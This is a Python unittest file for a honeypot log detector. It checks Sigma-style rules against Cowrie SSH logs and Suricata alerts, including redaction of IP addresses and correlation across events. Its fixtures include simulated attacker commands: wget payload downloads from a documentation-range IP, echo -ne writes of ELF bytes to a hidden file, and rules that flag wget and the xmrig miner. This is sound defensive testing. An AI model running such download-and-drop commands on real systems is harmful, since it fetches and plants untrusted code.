"""Tests for vps/detect.py. Run: python3 -m unittest discover -s tests

No network: a fake opener stands in for detections.uig.me.
IPs are from the RFC 5737 documentation ranges.
"""

import datetime
import gzip
import io
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "vps"))
import detect  # noqa: E402

NOW = datetime.datetime(2026, 11, 9, 12, tzinfo=datetime.timezone.utc)
HONEYPOT_IP = "192.0.2.50"

RULES = {"version": 1, "rules": [
    {"name": "download", "id": "id-download", "title": "Download", "level": "high",
     "detection": {"selection": {"eventid": "cowrie.command.input", "input|re": r"\bwget\b"},
                   "condition": "selection"}},
    {"name": "miner", "id": "id-miner", "title": "Miner", "level": "high",
     "detection": {"selection": {"eventid": "cowrie.command.input", "input|contains": "xmrig"},
                   "condition": "selection"}},
    {"name": "guessing", "id": "id-guessing", "title": "Guessing", "level": "medium",
     "correlation": {"type": "value_count", "rules": ["failed"], "group-by": ["src_ip"], "timespan": "10m",
                     "condition": {"gte": 3, "field": "password"}},
     "base": {"failed": {"selection": {"eventid": "cowrie.login.failed"}, "condition": "selection"}}},
    {"name": "broken", "id": "id-broken", "title": "Broken", "level": "low",
     "detection": {"selection": {"input|base64offset": "x"}, "condition": "selection"}},
]}


def ev(ts, session="s1", src="198.51.100.7", **kw):
    return {"eventid": "cowrie.command.input", "timestamp": ts, "src_ip": src, "session": session, **kw}


class FakeResponse(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def opener_returning(data):
    return lambda url, timeout: FakeResponse(json.dumps(data).encode())


def failing_opener(url, timeout):
    raise OSError("network unreachable")


class DetectTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.logs = self.tmp.name
        self.cache = os.path.join(self.tmp.name, "rules-cache.json")

    def tearDown(self):
        self.tmp.cleanup()

    def write_log(self, name, events):
        with open(os.path.join(self.logs, name), "w", encoding="utf-8") as fh:
            for e in events:
                fh.write((e if isinstance(e, str) else json.dumps(e)) + "\n")

    def run_rules(self):
        return detect.run(self.logs, RULES, NOW, redact=[HONEYPOT_IP], exclude=[HONEYPOT_IP])

    def test_single_event_rule_counts_sessions_days_and_example(self):
        cmd = f"wget http://203.0.113.9/x -O x; ssh root@{HONEYPOT_IP}"
        self.write_log("cowrie.json.2026-11-08", [
            ev("2026-11-08T10:00:00Z", "s1", input=cmd),
            ev("2026-11-08T10:00:05Z", "s1", input=cmd),
            ev("2026-11-08T11:00:00Z", "s2", input="busybox wget http://203.0.113.9/y"),
        ])
        self.write_log("cowrie.json", [ev("2026-11-09T09:00:00Z", "s3", input=cmd), "not json", "{}"])
        h = self.run_rules()["rules"]["download"]
        self.assertEqual(h["id"], "id-download")
        self.assertEqual((h["sessions"], h["alerts"]), (3, 4))
        self.assertEqual((h["first_seen"], h["last_seen"]), ("2026-11-08", "2026-11-09"))
        self.assertEqual(h["example"], "wget hxxp[:]//203[.]0[.]113[.]9/x -O x; ssh root@[honeypot-ip]")

    def test_no_ips_in_output(self):
        self.write_log("cowrie.json", [
            ev("2026-11-09T09:00:00Z", input="wget http://203.0.113.9/x"),
            {"eventid": "cowrie.login.failed", "timestamp": "2026-11-09T09:01:00Z", "src_ip": "198.51.100.7",
             "session": "s9", "password": "a"},
        ])
        out = json.dumps(self.run_rules())
        for ip in ("198.51.100.7", "203.0.113.9", HONEYPOT_IP):
            self.assertNotIn(ip, out)

    def test_unseen_rule_is_listed_with_zero(self):
        self.write_log("cowrie.json", [ev("2026-11-09T09:00:00Z", input="ls")])
        h = self.run_rules()["rules"]["miner"]
        self.assertEqual((h["sessions"], h["alerts"], h["first_seen"], h["example"]), (0, 0, None, None))

    def test_window_and_excluded_source(self):
        self.write_log("cowrie.json.2026-09-01", [ev("2026-09-01T10:00:00Z", input="wget a")])
        self.write_log("cowrie.json", [ev("2026-11-09T09:00:00Z", src=HONEYPOT_IP, input="wget b")])
        self.assertEqual(self.run_rules()["rules"]["download"]["sessions"], 0)

    def test_correlation_counts_alerts_and_sessions(self):
        fails = [{"eventid": "cowrie.login.failed", "timestamp": f"2026-11-09T09:0{i}:00Z",
                  "src_ip": "198.51.100.7", "session": f"s{i}", "password": f"pw{i}"} for i in range(4)]
        other = {"eventid": "cowrie.login.failed", "timestamp": "2026-11-09T09:02:00Z",
                 "src_ip": "198.51.100.8", "session": "x", "password": "pw"}
        self.write_log("cowrie.json", fails + [other])
        h = self.run_rules()["rules"]["guessing"]
        self.assertEqual((h["alerts"], h["sessions"], h["example"]), (1, 4, None))

    def test_rule_that_fails_on_an_event_is_dropped(self):
        self.write_log("cowrie.json", [ev("2026-11-09T09:00:00Z", input="wget x")])
        out = self.run_rules()["rules"]
        self.assertNotIn("broken", out)
        self.assertEqual(out["download"]["sessions"], 1)

    def test_example_skips_blanked_hex_chunks(self):
        zeros = 'echo -ne "' + "\\x00" * 20 + '" >> .d'
        elf = 'echo -ne "\\x7f\\x45\\x4c\\x46\\x02\\x01" > .d'
        self.write_log("cowrie.json", [ev("2026-11-09T09:00:00Z", input=zeros)] * 3 +
                       [ev("2026-11-09T09:00:01Z", input=elf)])
        rules = {"version": 1, "rules": [{"name": "hex", "id": "h", "detection": {
            "selection": {"input|contains": "echo -ne"}, "condition": "selection"}}]}
        h = detect.run(self.logs, rules, NOW)["rules"]["hex"]
        self.assertIn("\\x45\\x4c\\x46", h["example"])

    def test_fetch_caches_and_falls_back(self):
        self.assertEqual(detect.fetch_rules("u", self.cache, opener_returning(RULES)), RULES)
        self.assertEqual(detect.fetch_rules("u", self.cache, failing_opener), RULES)

    def test_fetch_rejects_bad_format_and_keeps_cache(self):
        detect.fetch_rules("u", self.cache, opener_returning(RULES))
        self.assertEqual(detect.fetch_rules("u", self.cache, opener_returning({"rules": "x"})), RULES)

    def test_fetch_without_cache_returns_none(self):
        self.assertIsNone(detect.fetch_rules("u", self.cache, failing_opener))



SURICATA_RULES = {"version": 1, "rules": [
    {"name": "exploit", "id": "id-exploit", "title": "Exploit", "level": "high",
     "detection": {"selection": {"signature|startswith": "ET EXPLOIT "}, "condition": "selection"}},
    {"name": "scan_login", "id": "id-scan-login", "title": "Scan then login", "level": "medium",
     "correlation": {"type": "temporal", "rules": ["scan", "login"], "group-by": ["src_ip"], "timespan": "1h"},
     "base": {"scan": {"selection": {"signature|startswith": "ET SCAN "}, "condition": "selection"},
              "login": {"selection": {"eventid": "cowrie.login.success"}, "condition": "selection"}}},
]}


def eve(ts, sig, src="203.0.113.20", event_type="alert"):
    """A raw eve.json line, as Suricata writes it (Beijing time, nested alert)."""
    return {"timestamp": ts, "event_type": event_type, "src_ip": src, "src_port": 40000,
            "dest_ip": "192.0.2.10", "dest_port": 23, "proto": "TCP",
            "alert": {"signature_id": 1, "rev": 1, "signature": sig, "category": "Misc Attack", "severity": 2}}


class DetectSuricataTest(DetectTest):
    def setUp(self):
        super().setUp()
        self.eve = os.path.join(self.tmp.name, "suricata")
        os.makedirs(self.eve)

    def run_suricata(self):
        return detect.run(self.logs, SURICATA_RULES, NOW, redact=[HONEYPOT_IP], exclude=[HONEYPOT_IP],
                          suricata_logs=self.eve)

    def write_eve(self, name, events, gz=False):
        data = "".join(json.dumps(e) + "\n" for e in events).encode()
        path = os.path.join(self.eve, name)
        with (gzip.open(path, "wb") if gz else open(path, "wb")) as fh:
            fh.write(data)

    def test_suricata_rule_counts_alerts_and_sources_not_sessions(self):
        self.write_eve("eve.json", [eve("2026-11-09T17:00:00.000000+0800", "ET EXPLOIT Example A"),
                                    eve("2026-11-09T17:05:00.000000+0800", "ET EXPLOIT Example B"),
                                    eve("2026-11-09T17:06:00.000000+0800", "ET EXPLOIT Example C", src="203.0.113.21"),
                                    eve("2026-11-09T17:07:00.000000+0800", "ET EXPLOIT Example D", event_type="flow"),
                                    eve("2026-11-09T17:08:00.000000+0800", "ET SCAN Example")])
        h = self.run_suricata()["rules"]["exploit"]
        self.assertEqual((h["alerts"], h["sources"], h["sessions"]), (3, 2, 0))
        self.assertEqual(h["first_seen"], "2026-11-09")   # 17:00 Beijing time is 09:00 UTC

    def test_reads_compressed_rotations(self):
        self.write_eve("eve.json.1.gz", [eve("2026-11-08T12:00:00.000000+0800", "ET EXPLOIT Old")], gz=True)
        self.write_eve("eve.json", [])
        self.assertEqual(self.run_suricata()["rules"]["exploit"]["alerts"], 1)

    def test_correlation_across_cowrie_and_suricata(self):
        self.write_eve("eve.json", [eve("2026-11-09T17:05:00.000000+0800", "ET SCAN Example", src="198.51.100.7"),
                                    eve("2026-11-09T17:05:00.000000+0800", "ET SCAN Example", src="198.51.100.9")])
        self.write_log("cowrie.json", [{"eventid": "cowrie.login.success", "timestamp": "2026-11-09T09:30:00Z",
                                        "src_ip": "198.51.100.7", "session": "s1"},
                                       {"eventid": "cowrie.login.success", "timestamp": "2026-11-09T09:30:00Z",
                                        "src_ip": "198.51.100.8", "session": "s2"}])
        h = self.run_suricata()["rules"]["scan_login"]
        self.assertEqual((h["alerts"], h["sessions"], h["sources"]), (1, 1, 1))

    def test_without_suricata_logs_suricata_rules_stay_at_zero(self):
        self.write_eve("eve.json", [eve("2026-11-09T17:00:00.000000+0800", "ET EXPLOIT Example A")])
        out = detect.run(self.logs, SURICATA_RULES, NOW)
        self.assertEqual(out["rules"]["exploit"]["alerts"], 0)


if __name__ == "__main__":
    unittest.main()
